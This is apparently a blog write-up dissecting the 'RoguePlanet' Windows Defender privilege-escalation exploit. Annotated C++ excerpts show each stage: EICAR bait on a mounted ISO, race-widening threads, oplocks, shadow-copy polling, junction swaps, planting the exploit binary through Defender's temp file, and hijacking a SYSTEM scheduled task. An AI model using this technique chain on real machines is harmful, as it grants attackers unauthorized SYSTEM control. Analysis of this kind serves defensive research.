---
title: Nightmare-Eclipse Series RoguePlanet — Full Code Breakdown of a Windows Defender LPE
date: 2026-07-16
categories: [Exploit Dev, Windows]
tags: [windows, privilege-escalation, exploit, defender, lpe, kernel, race-condition, c++]
---

## Description

**RoguePlanet** is a Windows Defender EoP exploit by **Nightmare-Eclipse** (~79000 lines of C++, mostly an embedded ISO). It uses a **race condition** in Defender's malware cleanup routine to achieve **SYSTEM** privileges. Tested on Windows 10 and Windows 11 (Official + Canary) with June 2026 patches.

The codebase consists of a single `RoguePlanet.cpp` file. The first ~78000 lines are: NT API typedefs, a massive enum copy of `SYSTEM_INFORMATION_CLASS`, and a 917KB embedded ISO9660 image containing the EICAR test file.

---

## 1. Global NTAPI Imports (Lines 30-86)

The exploit resolves several undocumented NT functions at runtime from `ntdll.dll`:

```cpp
// RoguePlanet.cpp:30-86
HMODULE ntdllhm = GetModuleHandle(L"ntdll.dll");

NTSTATUS(WINAPI* _NtSetInformationFile)(...) = 
    (NTSTATUS(WINAPI*)(...))GetProcAddress(ntdllhm, "NtSetInformationFile");

NTSTATUS(WINAPI* _NtDeleteFile)(...) = 
    (NTSTATUS(WINAPI*)(...))GetProcAddress(ntdllhm, "NtDeleteFile");

NTSTATUS(WINAPI* _NtOpenDirectoryObject)(...) = 
    (NTSTATUS(WINAPI*)(...))GetProcAddress(ntdllhm, "NtOpenDirectoryObject");

NTSTATUS(WINAPI* _NtQueryDirectoryObject)(...) = 
    (NTSTATUS(WINAPI*)(...))GetProcAddress(ntdllhm, "NtQueryDirectoryObject");

NTSTATUS(WINAPI* _NtQueryInformationFile)(...) = 
    (NTSTATUS(WINAPI*)(...))GetProcAddress(ntdllhm, "NtQueryInformationFile");
```

These are used for:
- **`NtSetInformationFile`** → rename files with `FileRenameInformationEx` (the `MoveToTempDir` function)
- **`NtDeleteFile`** → delete files at the NT namespace level
- **`NtOpenDirectoryObject`** / **`NtQueryDirectoryObject`** → enumerate the Object Manager namespace to find VSS volumes
- **`NtQueryInformationFile`** → query file metadata

A massive enum copy of `SYSTEM_INFORMATION_CLASS` and `FILE_INFORMATION_CLASS` is also embedded (lines 91-459) to use the correct info class values without including the full WDK headers.

---

## 2. The Embedded ISO — `rawData[917504]` (Lines 463-462+)

```cpp
// RoguePlanet.cpp:463
unsigned char rawData[917504] = { 0x00, 0x00, 0x00, ... };
```

This is a pre-crafted **ISO9660 CD image** containing a single file: `\wermgr.exe` — which is actually the **EICAR test file**. The exploit writes this ISO to disk and mounts it to access its contents. EICAR is the standard antivirus test signature — a known safe file that all antivirus products detect as a virus.

Why an ISO? Because mounting an ISO provides a **read-only filesystem** that Defender will scan but cannot modify. This gives the exploit a known-good copy of the EICAR file to use as bait.

---

## 3. `WriteEicar()` — The Bait (Lines 78154-78257)

This function creates the EICAR file in the working directory with a very specific structure:

```cpp
// RoguePlanet.cpp:78156-78257
HANDLE WriteEicar(wchar_t* workdir, wchar_t* isomnt)
{
    // Path: %TEMP%\RP_<GUID>\System32\wermgr.exe
    wchar_t eicarpath[MAX_PATH] = { 0 };
    wsprintf(eicarpath, L"%s\\wermgr.exe", workdir);

    // Create the file with DELETE access for later rename operations
    NTSTATUS stat = NtCreateFile(&hfile, 
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, ...);
```

**Two execution paths:**

**Path A — Cache hit (lines 78172-78183):** If `eicar_data` was already populated from a previous call (on the second call), it just writes the cached data directly.

**Path B — First run (lines 78184-78257):** Reads the EICAR data from the mounted ISO device path (`\Device\CdRomX\wermgr.exe`), writes it to the target file, then **creates an NTFS Alternate Data Stream** on the same file:

```cpp
// RoguePlanet.cpp:78228-78248
void* eicar2 = malloc(0x1000);
UNICODE_STRING adsname = { 0 };
RtlInitUnicodeString(&adsname, L":WDFOO");

// Open the ADS :WDFOO on the file
HANDLE hstream = NULL;
stat = NtCreateFile(&hstream, GENERIC_WRITE | SYNCHRONIZE, 
    &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, 
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
    FILE_CREATE, NULL, NULL, NULL);

// Write 0x1000 bytes of zeroes to the ADS
WriteFile(hstream, eicar2, 0x1000, &writtenbytes, &ovp);
```

The ADS `:WDFOO` is used with the VSS snapshot later. When Defender quarantines the file, Windows creates a Volume Shadow Copy. The exploit reads the ADS from the shadow copy to detect that Defender processed this specific file.

---

## 4. `MountISO()` — Mounting the Bait ISO (Lines 78346-78392)

```cpp
// RoguePlanet.cpp:78346-78392
bool MountISO(HANDLE* hiso)
{
    // Write embedded ISO to %TEMP%\RP_<GUID>
    HANDLE hf = CreateFile(target, GENERIC_READ | GENERIC_WRITE, ..., CREATE_ALWAYS, ...);
    WriteFile(hf, rawData, sizeof(rawData), &dwbytes, NULL);
    CloseHandle(hf);

    // Open as virtual disk and attach read-only
    VIRTUAL_STORAGE_TYPE vst = { VIRTUAL_STORAGE_TYPE_DEVICE_ISO, ... };
    OpenVirtualDisk(&vst, target, 
        VIRTUAL_DISK_ACCESS_GET_INFO | VIRTUAL_DISK_ACCESS_ATTACH_RO | VIRTUAL_DISK_ACCESS_DETACH, 
        OPEN_VIRTUAL_DISK_FLAG_NONE, NULL, &hvirtdisk);

    AttachVirtualDisk(hvirtdisk, NULL, 
        ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER, 
        NULL, NULL, NULL);
```

Key detail: `ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER` — the ISO mounts **without** a drive letter, appearing only in the Device namespace as `\Device\CdRomX`. This makes it less visible to the user.

---

## 5. `PoseidonThread` — CPU Stress for Widening the Race Window (Lines 78508-78547)

This is one of the most interesting techniques in the exploit:

```cpp
// RoguePlanet.cpp:78508-78547
HANDLE g_poseidonevent = CreateEvent(NULL, FALSE, FALSE, NULL);
bool g_poseidonexit = false;
char g_poseidonbuf[0x1000] = { 0 };

DWORD WINAPI PoseidonGeneratorThread(void*)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    WaitForSingleObject(g_poseidonevent, INFINITE);
    do {
        // Generate random data continuously
        BCryptGenRandom(NULL, (PUCHAR)g_poseidonbuf, sizeof(g_poseidonbuf), 
            BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    } while (!g_poseidonexit);
    return ERROR_SUCCESS;
}

DWORD WINAPI PoseidonThread(void*)
{
    wchar_t target[MAX_PATH] = { 0 };
    ExpandEnvironmentStrings(L"%TEMP%\\RP_", target, MAX_PATH);
    wcscat(target, wuid2);

    // Create a temporary file with FILE_FLAG_DELETE_ON_CLOSE
    HANDLE hfile = CreateFile(target, GENERIC_ALL, NULL, NULL, CREATE_NEW, 
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);

    WaitForSingleObject(g_poseidonevent, INFINITE);
    do {
        SetFilePointer(hfile, NULL, NULL, FILE_BEGIN);
        DWORD ret = 0;
        // Constantly overwrite the temp file with random data
        WriteFile(hfile, g_poseidonbuf, sizeof(g_poseidonbuf), &ret, NULL);
    } while (!g_poseidonexit);
}
```

These threads are spawned in `main()`:

```cpp
// RoguePlanet.cpp:78567-78579
SYSTEM_INFO sysinfo = { 0 };
GetSystemInfo(&sysinfo);
if (sysinfo.dwNumberOfProcessors > 3) {
    CreateThread(NULL, NULL, PoseidonGeneratorThread, NULL, NULL, &tid);
    for (int i = 0; i < sysinfo.dwNumberOfProcessors; i++) {
        CreateThread(NULL, NULL, PoseidonThread, NULL, NULL, &tid0);
    }
}
```

**Purpose:** Creates **N+1 threads** (1 generator + 1 per CPU core) that continuously write random data to temp files. This:
- Saturates all CPU cores with I/O operations
- Creates heavy filesystem contention
- **Slows down Defender** so the race window is larger
- The generator thread feeds fresh random data via `BCryptGenRandom`

The name "Poseidon" (god of the sea, earthquakes, and horses) is fitting — it's creating chaos to disturb the system's normal operation.

---

## 6. `main()` — The Orchestrator (Lines 78549-79002)

### 6a. SYSTEM Mode Detection (Lines 78553-78566)

```cpp
// RoguePlanet.cpp:78553-78566
if (IsRunningAsLocalSystem())
{
    printf("Running as local system.\n");
    // Connect back to the named pipe created by the user-level instance
    HANDLE hclient = CreateFile(L"\\\\.\\pipe\\RoguePlanet", ...);
    // Get the session ID from the pipe's server
    DWORD sesid = 0;
    GetNamedPipeServerSessionId(hclient, &sesid);
    CloseHandle(hclient);
    // Spawn a console in the user's session
    LaunchConsoleInSessionId(sesid);
    return 0;
}
```

The binary acts as both the **exploit** (user level) and **payload** (SYSTEM level). When run as SYSTEM, it detects that via `IsWellKnownSid(token, WinLocalSystemSid)` and connects back through the named pipe to find the user's session, then spawns a console there.

### 6b. Setup Phase (Lines 78582-78697)

```cpp
// Create named pipe for SYSTEM handoff
HANDLE hpipe = CreateNamedPipe(L"\\\\.\\pipe\\RoguePlanet", 
    PIPE_ACCESS_DUPLEX, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, ...);

// Mount the ISO
MountISO(&hvirtdisk);

// Open Windows directory and set an oplock on it
HANDLE hwin = CreateFile(windir2, GENERIC_READ, ..., FILE_FLAG_BACKUP_SEMANTICS, NULL);
// ...
REQUEST_OPLOCK_INPUT_BUFFER opin = { 0 };
opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
```

The oplock on the Windows directory is a **watchdog** — when any oplock break occurs, it signals that something is happening in the directory. Combined with `ReadDirectoryChangesW`, this becomes a powerful file-system monitoring setup.

### 6c. Working Directory Creation (Lines 78619-78673)

```cpp
// Create unique working directory
ExpandEnvironmentStrings(L"%TEMP%\\RP_", workdir, MAX_PATH);
wcscat(workdir, wuid2);
CreateDirectory(workdir, NULL);

// Subdirectory mimicking System32
HANDLE hdirtmp = NtCreateFile(L"\\??\\%s\\wdtest_temp", ...);

// Subdirectory for the WER mimic
HANDLE hdir = NtCreateFile(L"\\??\\%s\\System32", ...);
```

The exploit creates a directory structure that mirrors `C:\Windows\System32\wermgr.exe` inside `%TEMP%`. This is where the EICAR bait file lives.

### 6d. Triggering Defender & VSS Wait (Lines 78688-78725)

```cpp
// Signal Poseidon threads to start thrashing
SetEvent(g_poseidonevent);

// Start Defender scan in a separate thread
HANDLE hthread = CreateThread(NULL, NULL, WDStartScan, NULL, NULL, &tid);

// Wait for a VSS snapshot to appear
wchar_t vsspath[MAX_PATH] = { 0 };
ShadowCopyFinderThread(vsspath);
CloseHandle(heicar);  // Close the EICAR file handle

// Open the VSS copy and take an oplock on it
HANDLE hvss = NtCreateFile(L"%s\\%s\\System32\\wermgr.exe:WDFOO", ...);
DeviceIoControl(hvss, FSCTL_REQUEST_OPLOCK, ...);
WaitForSingleObject(ovoplock.hEvent, INFINITE);  // Wait for oplock break
```

The exploit accesses the file `wermgr.exe:WDFOO` (the ADS) inside the **VSS snapshot**. By taking an oplock on this path, when Defender's cleanup finishes and the VSS is released, the oplock breaks — **signaling that Defender is done with its operation**.

The VSS detection itself (lines 77764-77945) enumerates the `\Device` directory in the NT Object Manager, listing all `HarddiskVolumeShadowCopy*` entries, comparing against a baseline, and waiting for a new one to appear:

```cpp
// RoguePlanet.cpp:77793-77895
stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
// ... enumerate all objects until we find a new VSS volume

// Check if this object is a Volume Shadow Copy
if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
{
    // Is this a NEW one we haven't seen before?
    if (!found) {
        srchfound = true;
        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
        break;
    }
}
```

If no new VSS is found, it loops:

```cpp
// RoguePlanet.cpp:77897-77899
if (!srchfound) {
    restartscan = true;
    goto scanagain;  // keep polling
}
```

### 6e. Deleting the EICAR & Creating First Junction (Lines 78729-78737)

```cpp
// Open the EICAR file with DELETE access and FILE_SUPERSEDE to replace it
NTSTATUS delstat = NtCreateFile(&hc, DELETE, ..., FILE_SUPERSEDE, ...);
MoveToTempDir(hc);  // Rename it to a temp location

// Create a junction from System32 directory to the mounted ISO device path
CreateJunction(hdir, mntpath);  // \??\...\System32 → \Device\CdRomX
```

After this junction is created, any access to `%TEMP%\RP_<GUID>\System32\` resolves to the mounted ISO drive instead. This is the **first directory redirection**.

### 6f. Watching for Defender's Temp Files (Lines 78740-78748)

```cpp
// RoguePlanet.cpp:78740-78748
do {
    ZeroMemory(buff, sizeof(buff));
    DWORD retbytes = NULL;
    ReadDirectoryChangesW(hwin, buff, sizeof(buff), TRUE, 
        FILE_NOTIFY_CHANGE_FILE_NAME, &retbytes, NULL, NULL);
    PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
    
    // Wait for a file with exactly 24 chars starting with "Temp\TMP"
    if (pfni->FileNameLength / 2 != 24 || 
        _wcsnicmp(&pfni->FileName[0], teststr, 8) != 0)
        continue;
    break;
} while (1);
```

This monitors the **real** Windows directory for Defender creating quarantine temp files. Defender creates files like `Temp\TMPXXXX.tmp` during its cleanup operations. The check `FileNameLength / 2 != 24` filters for exactly the right filename length (24 wide characters).

### 6g. Re-pointing the Junction & Writing Payload (Lines 78751-78892)

Once Defender creates the temp file, the exploit swings into action:

```cpp
// RoguePlanet.cpp:78751-78756
// Re-point the junction from ISO device to the wdtest_temp directory
wchar_t workdir2[MAX_PATH] = {L"\\??\\"};
wcscat(workdir2, workdir);
CreateJunction(hdir, dirtmp);  // Now System32 points to wdtest_temp
```

Then it opens and **locks** the file on the ISO device path — this prevents Defender from accessing the original EICAR file:

```cpp
// RoguePlanet.cpp:78758-78780
HANDLE hlock1 = NtCreateFile(L"%s\\wermgr.exe", GENERIC_READ, ...);  // Opens from ISO via junction
LockFile(hlock1, NULL, NULL, MAXDWORD, MAXDWORD);  // Lock the entire file
```

Now the exploit re-writes the EICAR bait (second call to `WriteEicar`) and opens the target temp file:

```cpp
// RoguePlanet.cpp:78785-78812
// Open the EICAR file at the redirected path
HANDLE heicar2 = NtCreateFile(L"%s\\wermgr.exe", GENERIC_READ, ...);

// Watch for file SIZE changes in wdtest_temp directory
ReadDirectoryChangesW(hdirtmp, buff, sizeof(buff), TRUE, 
    FILE_NOTIFY_CHANGE_SIZE, &retbytes, NULL, NULL);
PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
wcscat(newfpath, &pfni->FileName[0]);  // Get the temp file name
```

It then opens this temp file, locks it, deletes the reparse point on the directory, and **writes the exploit's own PE binary into it**:

```cpp
// RoguePlanet.cpp:78819-78892
// Delete the reparse point on System32 directory
DeviceIoControl(hdir, FSCTL_DELETE_REPARSE_POINT, ...);

// Open the temp file and overwrite it with our payload
HANDLE htempfile = NtCreateFile(newfpath, GENERIC_READ | GENERIC_WRITE | DELETE, ..., FILE_OVERWRITE_IF, ...);

// Read our own EXE binary from disk
HANDLE hself = CreateFile(mx, GENERIC_READ, ...);
ReadFile(hself, exebuff, li.QuadPart, &readbytes, NULL);

// Write our binary into Defender's temp file
WriteFile(htempfile, exebuff, li.QuadPart, &readbytes, &ovp);
```

The payload is the **same exploit binary** — when it runs as SYSTEM later, it will take the SYSTEM path.

### 6h. Moving Files & Final Junction (Lines 78894-78927)

```cpp
// Move temp files out of the way
MoveToTempDir(htempfile);   // Move our payload to a safe temp location
MoveToTempDir(hdirtmp);     // Move wdtest_temp
MoveToTempDir(hdir);        // Move System32 directory

// Open the parent work directory
HANDLE hparent = NtCreateFile(L"\\??\\%TEMP%\\RP_<GUID>", ...);

// Create final junction: workdir → C:\Windows
wchar_t dest[MAX_PATH] = { L"\\??\\" };
wcscat(dest, __tmp);  // \??\C:\Windows
CreateJunction(hparent, dest);

// Clean up the ISO
DetachVirtualDisk(hvirtdisk, DETACH_VIRTUAL_DISK_FLAG_NONE, NULL);
CloseHandle(hvirtdisk);
```

After this, `%TEMP%\RP_<GUID>\` **is now a junction pointing to `C:\Windows`**. The payload file (the exploit EXE) has been moved to `%TEMP%\RP_<newguid>\System32\wermgr.exe`.

---

## 7. `WDStartScan()` — Calling Defender's Internal API (Lines 77986-78152)

This function runs in a separate thread and loads **MpClient.dll** directly from Defender's install directory:

```cpp
// RoguePlanet.cpp:77986-77995
DWORD WINAPI WDStartScan(void*)
{
    wchar_t dllpath[MAX_PATH] = { 0 };
    GetWDInstallDir(dllpath);  // Reads from registry: HKLM\SOFTWARE\Microsoft\Windows Defender\InstallLocation
    wcscat(dllpath, L"MpClient.dll");
    HMODULE hm = LoadLibrary(dllpath);
```

It resolves all the MpClient API functions dynamically via `GetProcAddress`:

```cpp
HRESULT(WINAPI* _MpManagerOpen)(...) = GetProcAddress(hm, "MpManagerOpen");
HRESULT(WINAPI* _MpScanStart)(...)    = GetProcAddress(hm, "MpScanStart");
HRESULT(WINAPI* _MpScanResult)(...)   = GetProcAddress(hm, "MpScanResult");
HRESULT(WINAPI* _MpThreatOpen)(...)   = GetProcAddress(hm, "MpThreatOpen");
HRESULT(WINAPI* _MpThreatEnumerate)(...) = GetProcAddress(hm, "MpThreatEnumerate");
HRESULT(WINAPI* _MpCleanOpen)(...)    = GetProcAddress(hm, "MpCleanOpen");
HRESULT(WINAPI* _MpCleanStart)(...)   = GetProcAddress(hm, "MpCleanStart");
HRESULT(WINAPI* _MpHandleClose)(...)  = GetProcAddress(hm, "MpHandleClose");
```

Then triggers a scan on the EICAR file:

```cpp
// RoguePlanet.cpp:78070-78086
MPHANDLE hbinding = NULL;
_MpManagerOpen(NULL, &hbinding);

MPRESOURCE_INFO scaninfo = { 0 };
scaninfo.Scheme = (wchar_t*)L"file";
scaninfo.Path = zippath;  // Path to wermgr.exe (the EICAR file)

MPHANDLE scanctx = NULL;
_MpScanStart(hbinding, MPSCAN_TYPE_RESOURCE, 0x60004000, &scanrsrc, NULL, &scanctx);
// 0x8050111C scan pending
```

When Defender detects EICAR, it returns `ThreatStatus == 0x01`:

```cpp
// RoguePlanet.cpp:78103-78126
_MpThreatOpen(scanctx, MPTHREAT_SOURCE_SCAN, MPTHREAT_TYPE_KNOWNBAD, &threatctx);
_MpThreatEnumerate(threatctx, &tinfo);
if (tinfo->ThreatStatus != 0x1) { /* no threat found */ }
```

Then calls `MpCleanStart` with a **callback function** — this is what triggers Defender's quarantine/cleanup routine:

```cpp
// RoguePlanet.cpp:78128-78145
void** ret = NULL;
_MpCleanOpen(scanctx, NULL, &ret);

void* callbackaddr[2] = { MpCleanCallbackFunction, MpCleanCallbackFunction };
_MpCleanStart(ret, NULL, callbackaddr);
```

The callback is minimal:

```cpp
// RoguePlanet.cpp:77948-77953
DWORD MpCleanCallbackFunction()
{
    printf("MpCleanCallbackFunction called.\n");
    return 0;
}
```

It exists so Defender has a valid callback address to invoke during cleanup. The real work happens in the race condition triggered by Defender creating temp files during this cleanup.

---

## 8. `MoveToTempDir()` — Aggressive File Renaming (Lines 78260-78297)

```cpp
// RoguePlanet.cpp:78260-78297
bool MoveToTempDir(HANDLE hobj, wchar_t* targetpath = NULL)
{
    GUID uid = { 0 };
    UuidCreate(&uid);
    UuidToStringW(&uid, &wuid);
    
    wchar_t target[MAX_PATH] = { 0 };
    if (targetpath)
        wcscpy(target, targetpath);
    else
        // Default: \??\%TEMP%\RP_<GUID>
        ExpandEnvironmentStrings(L"\\??\\%TEMP%\\RP_", target, MAX_PATH);
        wcscat(target, wuid2);

    PFILE_RENAME_INFORMATION fri = ...;
    fri->Flags = 0x00000001 | 0x00000040;  // RENAME_REPLACE_IF_EXISTS | RENAME_POSIX_SEMANTICS

    do {
        NTSTATUS stat = _NtSetInformationFile(hobj, &iostat, fri, ..., 
            FileRenameInformationEx);
        if (stat == STATUS_SUCCESS)
            return true;
        if (stat == STATUS_SHARING_VIOLATION)
            continue;  // Infinite retry on sharing violation
        // ... handle other errors
    } while (1);
}
```

**Key technique:** Uses `FileRenameInformationEx` with `RENAME_POSIX_SEMANTICS` flag (0x00000040) which allows renaming even when the file has other open handles. The infinite loop with `STATUS_SHARING_VIOLATION` retry is aggressive — it **busy-loops** until the rename succeeds, taking advantage of the race window.

---

## 9. `CreateJunction()` — Reparse Point Manipulation (Lines 78299-78344)

```cpp
// RoguePlanet.cpp:78299-78344
bool CreateJunction(HANDLE hdir, wchar_t* target)
{
    REPARSE_DATA_BUFFER* rdb = HeapAlloc(GetProcessHeap(), ..., totalsz);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;  // Mount point, not symbolic link
    rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
    
    // Set substitute name (NT namespace path)
    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
    
    // Set print name (display name, empty here)
    rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, printname, printnamesz);

    // Apply via FSCTL
    DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
}
```

Creates `IO_REPARSE_TAG_MOUNT_POINT` junctions — the same type used for volume mount points and directory junctions. The target path uses NT namespace (`\??\` or `\Device\` paths).

---

## 10. `LaunchConsoleInSessionId()` — SYSTEM → User Handoff (Lines 78463-78498)

```cpp
// RoguePlanet.cpp:78463-78498
void LaunchConsoleInSessionId(DWORD sessionid)
{
    HANDLE htoken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken);

    // Enable required privileges for token duplication and session switching
    SetPrivilege(htoken, SE_TCB_NAME, TRUE);
    SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
    SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
    SetPrivilege(htoken, SE_DEBUG_NAME, TRUE);

    // Duplicate to a primary token
    HANDLE hnewtoken = NULL;
    DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, 
        SecurityDelegation, TokenPrimary, &hnewtoken);

    // Set the session ID to the user's session
    SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));

    // Spawn a console as the user
    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", 
        NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
}
```

The SYSTEM instance gets the target session ID from the named pipe's server session (via `GetNamedPipeServerSessionId`), then uses `CreateProcessAsUser` to spawn `conhost.exe` in that session. The result: a SYSTEM-privilege command prompt visible to the user.

---

## 11. `ShadowCopyFinderThread()` — The VSS Watcher (Lines 77764-77945)

This is a critical piece. It discovers new Volume Shadow Copies by polling the NT Object Manager:

```cpp
// RoguePlanet.cpp:77793-77810
// First, enumerate existing VSS volumes as baseline
vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum, &retval);

// Then poll in a loop for NEW ones
scanagain:
do {
    stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, 
        restartscan, &scanctx, &retsz);
    // ...
} while (1);

// Filter for "Device" type objects named "HarddiskVolumeShadowCopy*"
for (ULONG i = 0; i < ULONG_MAX; i++) {
    if (objdirinfo[i].TypeName == L"Device" && 
        objdirinfo[i].Name starts with L"HarddiskVolumeShadowCopy") {
        // Check if it's new (not in our baseline list)
        if (!found) {
            // Found a new VSS volume!
            srchfound = true;
            break;
        }
    }
}

if (!srchfound) goto scanagain;  // Keep polling
```

The `retry` loop after detection handles the brief period where the VSS device exists but its contents aren't ready yet:

```cpp
// RoguePlanet.cpp:77918-77921
retry:
stat = NtCreateFile(&hlk, FILE_READ_ATTRIBUTES, &objattr2, ..., FILE_OPEN, ...);
if (stat == STATUS_NO_SUCH_DEVICE)
    goto retry;  // Spin until it's ready
```

---

## The Complete Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Mount embedded ISO (EICAR as wermgr.exe)                     │
│ 2. Create %TEMP%\RP_<GUID>\System32\wermgr.exe (EICAR copy)     │
│ 3. Spawn Poseidon threads to thrash CPU/filesystem                │
│ 4. Start Defender scan on EICAR via MpClient.dll API             │
│ 5. Set oplock on C:\Windows, wait for Defender's temp file       │
│ 6. When Defender creates Temp\TMPXXXX →                          │
│    a. Junction System32 → wdtest_temp                            │
│    b. Lock original EICAR on ISO path                            │
│    c. Re-write EICAR bait                                        │
│    d. Wait for Defender's temp file via ReadDirectoryChangesW     │
│    e. Overwrite temp file with exploit's own PE binary           │
│ 7. Move payload to %TEMP%\RP_<GUID2>\System32\wermgr.exe         │
│ 8. Junction %TEMP%\RP_<GUID> → C:\Windows                        │
│ 9. Trigger WER QueueReporting task (runs as SYSTEM)              │
│ 10. Task executes %SystemRoot%\System32\wermgr.exe →             │
│     Resolves to our payload via junction                          │
│ 11. Payload runs as SYSTEM, connects named pipe,                  │
│     spawns conhost.exe in user session                            │
└─────────────────────────────────────────────────────────────────┘
```

---

## Vulnerabilities Exploited

**1. MpClient.dll accessible from user mode** — Defender's RPC interface (`MpManagerOpen`, `MpScanStart`, `MpCleanStart`) doesn't enforce access checks. Any user can trigger scans and cleanup operations.

**2. Race condition in Defender's quarantine** — Defender creates temp files with predictable names (`Temp\TMPXXXX`), operates on them without proper locking, and doesn't validate reparse points along the path.

**3. Junction redirection not verified** — Neither Defender nor the Task Scheduler checks whether `C:\Windows\System32\wermgr.exe` is a real file or a junction pointing elsewhere. The WER `QueueReporting` task blindly executes whatever is at that path.

**4. Oplocks not respected** — Defender doesn't properly handle oplock breaks during cleanup operations, allowing the exploit to intercept file operations.

**5. VSS as a timing side-channel** — The exploit uses the appearance of a new Volume Shadow Copy as a signal that Defender has begun its cleanup. This is a creative use of VSS as a timing oracle.

**6. No cryptographic verification in WER task** — The `QueueReporting` task runs as SYSTEM but doesn't verify the digital signature of `wermgr.exe` before executing it.

---

## Conclusion

RoguePlanet is a masterclass in Windows race-condition exploitation. It chains **ISO mounting** → **Defender MpClient API abuse** → **EICAR trigger** → **oplock-based race** → **VSS timing side-channel** → **junction redirection** → **WER scheduled task hijack** into a full SYSTEM privilege escalation.

The author's frustration is evident throughout the code. The comment at line 78978-78980 says it all:

```cpp
// I really hate doing this, I really do, but I don't have any choices,
// For the first time in my life, my tears burned my eyes adding more pain to the existing agony.
// You know that Microsoft, why do you keep doing this to me...
```

And the README:

> *"The race condition part is a bit interesting, I believe (but not sure) that a redesign of the PoC can make it achieve a 100% success rate regardless of the conditions but honestly I'm done with this bug."*

A beautiful, painful, and highly effective piece of Windows offensive research.

---

## Resources

- [RoguePlanet source code (GitHub)](https://github.com/Nightmare-Eclipse/RoguePlanet)
- [FSCTL_REQUEST_OPLOCK documentation](https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_request_oplock)
- [Windows Defender MpClient.dll (undocumented)](https://learn.microsoft.com/en-us/defender-endpoint/)
- [Windows Error Reporting](https://learn.microsoft.com/en-us/windows/win32/wer/windows-error-reporting)
- [NTFS Reparse Points](https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points)
- [Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview)

[Windows](/tags/windows/) [Privilege Escalation](/tags/privilege-escalation/) [Exploit Dev](/tags/exploit-dev/) [Defender](/tags/defender/) [LPE](/tags/lpe/) [Race Condition](/tags/race-condition/) [C++](/tags/cpp/)
